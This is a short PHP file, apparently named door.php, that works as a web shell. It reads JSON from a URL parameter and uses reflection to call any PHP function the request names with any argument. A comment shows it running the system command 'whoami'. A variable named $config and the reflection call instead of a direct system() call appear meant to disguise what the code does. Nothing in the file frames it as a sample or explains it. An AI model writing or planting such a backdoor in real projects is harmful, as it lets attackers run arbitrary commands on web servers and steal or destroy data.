<?php
//door.php?p={"a":"system","b":"whoami"}
$p = json_decode($_GET['p'], true);
echo '<pre>';
$config = new ReflectionFunction($p['a']);
$config->invoke($p['b']);
echo '</pre>';
?>